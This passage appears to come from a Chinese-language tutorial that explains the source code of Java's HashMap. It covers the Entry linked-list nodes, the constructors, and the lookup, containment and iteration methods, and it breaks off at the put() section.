<figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123;</div><div class="line">    <span class="keyword">final</span> K <span class="built_in">key</span>;</div><div class="line">    V value;</div><div class="line">    <span class="comment">// 指向下一个节点</span></div><div class="line">    Entry&lt;K,V&gt; next;</div><div class="line">    <span class="keyword">final</span> <span class="built_in">int</span> hash;</div><div class="line"></div><div class="line">    <span class="comment">// 构造函数。</span></div><div class="line">    <span class="comment">// 输入参数包括"哈希值(h)", "键(k)", "值(v)", "下一节点(n)"</span></div><div class="line">    Entry(<span class="built_in">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</div><div class="line">        value = v;</div><div class="line">        next = n;</div><div class="line">        <span class="built_in">key</span> = k;</div><div class="line">        hash = h;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">final</span> K getKey() &#123;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">key</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V getValue() &#123;</div><div class="line">        <span class="keyword">return</span> value;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V setValue(V newValue) &#123;</div><div class="line">        V oldValue = value;</div><div class="line">        value = newValue;</div><div class="line">        <span class="keyword">return</span> oldValue;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 判断两个Entry是否相等</span></div><div class="line">    <span class="comment">// 若两个Entry的“key”和“value”都相等，则返回true。</span></div><div class="line">    <span class="comment">// 否则，返回false</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="built_in">boolean</span> equals(<span class="keyword">Object</span> o) &#123;</div><div class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map.Entry))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        Map.Entry e = (Map.Entry)o;</div><div class="line">        <span class="keyword">Object</span> k1 = getKey();</div><div class="line">        <span class="keyword">Object</span> k2 = e.getKey();</div><div class="line">        <span class="keyword">if</span> (k1 == k2 || (k1 != <span class="keyword">null</span> &amp;&amp; k1.equals(k2))) &#123;</div><div class="line">            <span class="keyword">Object</span> v1 = getValue();</div><div class="line">            <span class="keyword">Object</span> v2 = e.getValue();</div><div class="line">            <span class="keyword">if</span> (v1 == v2 || (v1 != <span class="keyword">null</span> &amp;&amp; v1.equals(v2)))</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 实现hashCode()</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="built_in">int</span> hashCode() &#123;</div><div class="line">        <span class="keyword">return</span> (<span class="built_in">key</span>==<span class="keyword">null</span>   ? <span class="number">0</span> : <span class="built_in">key</span>.hashCode()) ^</div><div class="line">               (value==<span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">String</span> toString() &#123;</div><div class="line">        <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 当向HashMap中添加元素时，绘调用recordAccess()。</span></div><div class="line">    <span class="comment">// 这里不做任何处理</span></div><div class="line">    <span class="keyword">void</span> recordAccess(<span class="keyword">HashMap</span>&lt;K,V&gt; m) &#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 当从HashMap中删除元素时，绘调用recordRemoval()。</span></div><div class="line">    <span class="comment">// 这里不做任何处理</span></div><div class="line">    <span class="keyword">void</span> recordRemoval(<span class="keyword">HashMap</span>&lt;K,V&gt; m) &#123;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div>
<p>&nbsp;&nbsp;&nbsp;&nbsp;从中，我们可以看出Entry实际上就是一个单向链表。这也是为什么我们说HashMap是通过拉链法解决哈希冲突的。<br>Entry实现Map.Entry接口，即实现<code>getKey()</code>、<code>getValue()</code>、<code>setValue(V value)</code>、<code>equals(Object o)</code>、<code>hashCode()</code>这些函数。这些都是基于的读取/修改<code>key</code>、<code>value</code>值的函数。</p>
<h3 id="HashMap的构造函数-1"><a href="#HashMap的构造函数-1" class="headerlink" title="HashMap的构造函数"></a>HashMap的构造函数</h3><p>HashMap共包括4个构造函数<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 默认构造函数。</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="comment">// 设置“加载因子”</span></div><div class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR;</div><div class="line">    <span class="comment">// 设置“HashMap阈值”，当HashMap中存储数据的数量达到threshold时，就需要将HashMap的容量加倍。</span></div><div class="line">    threshold = (<span class="keyword">int</span>)(DEFAULT_INITIAL_CAPACITY * DEFAULT_LOAD_FACTOR);</div><div class="line">    <span class="comment">// 创建Entry数组，用来保存数据</span></div><div class="line">    table = <span class="keyword">new</span> Entry[DEFAULT_INITIAL_CAPACITY];</div><div class="line">    init();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 指定“容量大小”和“加载因子”的构造函数</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal initial capacity: "</span> +</div><div class="line">                                           initialCapacity);</div><div class="line">    <span class="comment">// HashMap的最大容量只能是MAXIMUM_CAPACITY</span></div><div class="line">    <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</div><div class="line">        initialCapacity = MAXIMUM_CAPACITY;</div><div class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal load factor: "</span> +</div><div class="line">                                           loadFactor);</div><div class="line"></div><div class="line">    <span class="comment">// Find a power of 2 &gt;= initialCapacity</span></div><div class="line">    <span class="keyword">int</span> capacity = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (capacity &lt; initialCapacity)</div><div class="line">        capacity &lt;&lt;= <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 设置“加载因子”</span></div><div class="line">    <span class="keyword">this</span>.loadFactor = loadFactor;</div><div class="line">    <span class="comment">// 设置“HashMap阈值”，当HashMap中存储数据的数量达到threshold时，就需要将HashMap的容量加倍。</span></div><div class="line">    threshold = (<span class="keyword">int</span>)(capacity * loadFactor);</div><div class="line">    <span class="comment">// 创建Entry数组，用来保存数据</span></div><div class="line">    table = <span class="keyword">new</span> Entry[capacity];</div><div class="line">    init();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 指定“容量大小”的构造函数</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</div><div class="line">    <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 包含“子Map”的构造函数</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(Map&lt;? <span class="keyword">extends</span> K, ? <span class="keyword">extends</span> V&gt; m)</span> </span>&#123;</div><div class="line">    <span class="keyword">this</span>(Math.max((<span class="keyword">int</span>) (m.size() / DEFAULT_LOAD_FACTOR) + <span class="number">1</span>,</div><div class="line">                  DEFAULT_INITIAL_CAPACITY), DEFAULT_LOAD_FACTOR);</div><div class="line">    <span class="comment">// 将m中的全部元素逐个添加到HashMap中</span></div><div class="line">    putAllForCreate(m);</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div></p>
<h3 id="HashMap的主要对外接口"><a href="#HashMap的主要对外接口" class="headerlink" title="HashMap的主要对外接口"></a>HashMap的主要对外接口</h3><h4 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h4><p><code>clear()</code>的作用是<code>清空HashMap</code>。它是通过将所有的元素设为null来实现的。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="built_in">clear</span>() &#123;</div><div class="line">    modCount++;</div><div class="line">    Entry[] tab = table;</div><div class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; tab.length; i++)</div><div class="line">        tab[i] = <span class="keyword">null</span>;</div><div class="line">    <span class="built_in">size</span> = <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="containsKey"><a href="#containsKey" class="headerlink" title="containsKey()"></a>containsKey()</h4><p><code>containsKey()</code>的作用是判断HashMap是否包含Key。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> containsKey(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">    <span class="keyword">return</span> getEntry(<span class="built_in">key</span>) != <span class="keyword">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>containsKey()</code>首先通过<code>getEntry(key)</code>获取<code>key</code>对应的<code>Entry</code>，然后判断该<code>Entry</code>是否为null。<br><code>getEntry()</code>的源码如下：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> Entry&lt;K,V&gt; getEntry(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">    <span class="comment">// 获取哈希值</span></div><div class="line">    <span class="comment">// HashMap将“key为null”的元素存储在table[0]位置，“key不为null”的则调用hash()计算哈希值</span></div><div class="line">    <span class="built_in">int</span> hash = (<span class="built_in">key</span> == <span class="keyword">null</span>) ? <span class="number">0</span> : hash(<span class="built_in">key</span>.hashCode());</div><div class="line">    <span class="comment">// 在“该hash值对应的链表”上查找“键值等于key”的元素</span></div><div class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</div><div class="line">         e != <span class="keyword">null</span>;</div><div class="line">         e = e.next) &#123;</div><div class="line">        <span class="keyword">Object</span> k;</div><div class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp;</div><div class="line">            ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || (<span class="built_in">key</span> != <span class="keyword">null</span> &amp;&amp; <span class="built_in">key</span>.equals(k))))</div><div class="line">            <span class="keyword">return</span> e;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>getEntry()</code>的作用就是返回”键为key”的键值对，它的实现源码中已经进行了说明。<br>这里需要强调的是：HashMap将”key为null”的元素都放在<code>table的位置0</code>处，即<code>table[0]</code>中：”key不为null”的放在table的其余位置！</p>
<h4 id="containsValue"><a href="#containsValue" class="headerlink" title="containsValue()"></a>containsValue()</h4><p><code>containsValue()</code>的作用是判断HashMap是否包含<code>值为value</code>的元素。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> boolean <span class="title">containsValue</span>(<span class="params">Object <span class="keyword">value</span></span>) </span>&#123;</div><div class="line">    <span class="comment">// 若“value为null”，则调用containsNullValue()查找</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">value</span> == <span class="literal">null</span>)</div><div class="line">        <span class="keyword">return</span> containsNullValue();</div><div class="line"></div><div class="line">    <span class="comment">// 若“value不为null”，则查找HashMap中是否有值为value的节点。</span></div><div class="line">    Entry[] tab = table;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tab.length ; i++)</div><div class="line">        <span class="keyword">for</span> (Entry e = tab[i] ; e != <span class="literal">null</span> ; e = e.next)</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">value</span>.<span class="keyword">equals</span>(e.<span class="keyword">value</span>))</div><div class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从中，我们可以看出<code>containsNullValue()</code>分为两步进行处理：第一，若”value为null”，则调用<code>containsNullValue()</code>。第二，若”value不为null”，则查找<code>HashMap</code>中是否有值为value的节点。<br><code>containsNullValue()</code>的作用判断<code>HashMap</code>中是否包含”值为null”的元素。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">boolean</span> <span class="title">containsNullValue</span><span class="params">()</span> </span>&#123;</div><div class="line">    Entry[] tab = table;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tab.length ; i++)</div><div class="line">        <span class="keyword">for</span> (Entry e = tab[i] ; e != <span class="keyword">null</span> ; e = e.next)</div><div class="line">            <span class="keyword">if</span> (e.value == <span class="keyword">null</span>)</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="entrySet-、values-、keySet"><a href="#entrySet-、values-、keySet" class="headerlink" title="entrySet()、values()、keySet()"></a>entrySet()、values()、keySet()</h4><p>它们三个的原理类似，这里以<code>entrySet()</code>为例来说明。<br><code>entrySet()</code>的作用是返回”HashMap中所有Entry的集合”，它是一个集合。实现代码如下：<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 返回“HashMap的Entry集合”</span></div><div class="line"><span class="keyword">public</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() &#123;</div><div class="line">    <span class="function"><span class="keyword">return</span> <span class="title">entrySet0</span><span class="params">()</span></span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 返回“HashMap的Entry集合”，它实际是返回一个EntrySet对象</span></div><div class="line"><span class="keyword">private</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet0() &#123;</div><div class="line">    Set&lt;Map.Entry&lt;K,V&gt;&gt; es = entrySet;</div><div class="line">    <span class="keyword">return</span> es != <span class="keyword">null</span> ? es : (entrySet = <span class="keyword">new</span> EntrySet());</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// EntrySet对应的集合</span></div><div class="line"><span class="comment">// EntrySet继承于AbstractSet，说明该集合中没有重复的EntrySet。</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">EntrySet</span> <span class="keyword">extends</span> <span class="title">AbstractSet</span>&lt;<span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;&gt; </span>&#123;</div><div class="line">    <span class="keyword">public</span> Iterator&lt;Map.Entry&lt;K,V&gt;&gt; iterator() &#123;</div><div class="line">        <span class="function"><span class="keyword">return</span> <span class="title">newEntryIterator</span><span class="params">()</span></span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map.Entry))</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        Map.Entry&lt;K,V&gt; e = (Map.Entry&lt;K,V&gt;) o;</div><div class="line">        Entry&lt;K,V&gt; candidate = getEntry(e.getKey());</div><div class="line">        <span class="keyword">return</span> candidate != <span class="keyword">null</span> &amp;&amp; candidate.equals(e);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> removeMapping(o) != <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> size;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</div><div class="line">        HashMap.<span class="keyword">this</span>.clear();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div><br><code>HashMap</code>是通过拉链法实现的散列表。表现在HashMap包括许多的Entry，而每一个Entry本质上又是一个单向链表。那么HashMap遍历key-value键值对的时候，是如何逐个去遍历的呢？<br><code>entrySet()</code>实际上是通过<code>newEntryIterator()</code>实现的。<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 返回一个“entry迭代器”</span></div><div class="line">Iterator&lt;Map.Entry&lt;K,V&gt;&gt; newEntryIterator()   &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> EntryIterator();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Entry的迭代器</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">EntryIterator</span> <span class="keyword">extends</span> <span class="title">HashIterator</span>&lt;<span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;&gt; </span>&#123;</div><div class="line">    <span class="keyword">public</span> Map.Entry&lt;K,V&gt; next() &#123;</div><div class="line">        <span class="keyword">return</span> nextEntry();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// HashIterator是HashMap迭代器的抽象出来的父类，实现了公共了函数。</span></div><div class="line"><span class="comment">// 它包含“key迭代器(KeyIterator)”、“Value迭代器(ValueIterator)”和“Entry迭代器(EntryIterator)”3个子类。</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">HashIterator</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</div><div class="line">    <span class="comment">// 下一个元素</span></div><div class="line">    Entry&lt;K,V&gt; next;</div><div class="line">    <span class="comment">// expectedModCount用于实现fast-fail机制。</span></div><div class="line">    <span class="keyword">int</span> expectedModCount;</div><div class="line">    <span class="comment">// 当前索引</span></div><div class="line">    <span class="keyword">int</span> <span class="keyword">index</span>;</div><div class="line">    <span class="comment">// 当前元素</span></div><div class="line">    Entry&lt;K,V&gt; current;</div><div class="line"></div><div class="line">    HashIterator() &#123;</div><div class="line">        expectedModCount = modCount;</div><div class="line">        <span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123; <span class="comment">// advance to first entry</span></div><div class="line">            Entry[] t = table;</div><div class="line">            <span class="comment">// 将next指向table中第一个不为null的元素。</span></div><div class="line">            <span class="comment">// 这里利用了index的初始值为0，从0开始依次向后遍历，直到找到不为null的元素就退出循环。</span></div><div class="line">            <span class="keyword">while</span> (<span class="keyword">index</span> &lt; t.length &amp;&amp; (next = t[<span class="keyword">index</span>++]) == <span class="keyword">null</span>)</div><div class="line">                ;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> hasNext() &#123;</div><div class="line">        <span class="keyword">return</span> next != <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 获取下一个元素</span></div><div class="line">    <span class="keyword">final</span> Entry&lt;K,V&gt; nextEntry() &#123;</div><div class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">        Entry&lt;K,V&gt; e = next;</div><div class="line">        <span class="keyword">if</span> (e == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</div><div class="line"></div><div class="line">        <span class="comment">// 注意！！！</span></div><div class="line">        <span class="comment">// 一个Entry就是一个单向链表</span></div><div class="line">        <span class="comment">// 若该Entry的下一个节点不为空，就将next指向下一个节点;</span></div><div class="line">        <span class="comment">// 否则，将next指向下一个链表(也是下一个Entry)的不为null的节点。</span></div><div class="line">        <span class="keyword">if</span> ((next = e.next) == <span class="keyword">null</span>) &#123;</div><div class="line">            Entry[] t = table;</div><div class="line">            <span class="keyword">while</span> (<span class="keyword">index</span> &lt; t.length &amp;&amp; (next = t[<span class="keyword">index</span>++]) == <span class="keyword">null</span>)</div><div class="line">                ;</div><div class="line">        &#125;</div><div class="line">        current = e;</div><div class="line">        <span class="keyword">return</span> e;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 删除当前元素</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">void</span> remove() &#123;</div><div class="line">        <span class="keyword">if</span> (current == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</div><div class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</div><div class="line">        Object k = current.key;</div><div class="line">        current = <span class="keyword">null</span>;</div><div class="line">        HashMap.<span class="keyword">this</span>.removeEntryForKey(k);</div><div class="line">        expectedModCount = modCount;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div><br>当我们通过<code>entrySet()</code>获取到的<code>Iterator</code>的<code>next()</code>方法去遍历<code>HashMap</code>时，实际上调用的是<code>nextEntry()</code>。而<code>nextEntry()</code>的实现方式，先遍历<code>Entry</code>(根据Entry在table中的序号，从小到大的遍历)；然后对每个Entry(即每个单向链表)，逐个遍历。</p>
<h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p><code>get()</code>的作用是获取<code>key</code>对应的<code>value</code>，它的实现代码如下：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> V <span class="built_in">get</span>(<span class="keyword">Object</span> <span class="built_in">key</span>) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">key</span> == <span class="keyword">null</span>)</div><div class="line">        <span class="keyword">return</span> getForNullKey();</div><div class="line">    <span class="comment">// 获取key的hash值</span></div><div class="line">    <span class="built_in">int</span> hash = hash(<span class="built_in">key</span>.hashCode());</div><div class="line">    <span class="comment">// 在“该hash值对应的链表”上查找“键值等于key”的元素</span></div><div class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</div><div class="line">         e != <span class="keyword">null</span>;</div><div class="line">         e = e.next) &#123;</div><div class="line">        <span class="keyword">Object</span> k;</div><div class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.<span class="built_in">key</span>) == <span class="built_in">key</span> || <span class="built_in">key</span>.equals(k)))</div><div class="line">            <span class="keyword">return</span> e.value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="put"><a href="#put" class="headerlink" title="put()"></a>put()</h4><p><code>put()</code>的作用是对外提供接口，让<code>HashMap</code>对象可以通过<code>put()</code>将”key-value”添加到<code>HashMap</code>中。<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
